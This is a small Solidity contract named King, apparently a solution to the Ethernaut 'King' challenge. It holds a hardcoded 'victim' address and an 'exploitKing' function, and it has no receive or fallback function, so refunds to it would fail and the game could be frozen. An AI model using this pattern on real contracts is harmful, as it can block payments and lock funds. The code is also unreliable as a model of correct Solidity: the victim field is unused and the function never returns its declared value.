/**
 *Submitted for verification at Etherscan.io on 2022-04-06
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract King {

    uint256 public storedValue;
    address public victim = 0xc5e251c35d5AC5530dF84e2B5E8c4c57159BCBB2;
  
  constructor() public payable {
      require (msg.value > 0);
      uint256 _storedValue = msg.value; 
      storedValue = _storedValue;
  }

  function exploitKing (address payable _to) public payable returns (bool){
      _to.transfer(storedValue);
  }


}